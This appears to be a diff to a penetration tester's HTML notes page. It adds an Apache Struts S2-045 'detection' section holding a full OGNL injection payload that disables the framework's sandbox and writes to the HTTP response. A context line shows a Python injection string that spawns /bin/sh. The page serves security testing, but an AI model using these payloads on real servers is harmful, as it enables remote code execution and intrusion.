@@ -164,3 +164,9 @@ asd__import__('os').system('/bin/sh')asd
 <h2>command injection</h2>
 <p>what to look for</p>
 <li>app</li>
+
+
+
+<h2>apache struts s2-045</h2>
+<p>detection</p>
+<code>"%{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getWriter())).(#ros.print('\ntest\n\n'))}"</code>
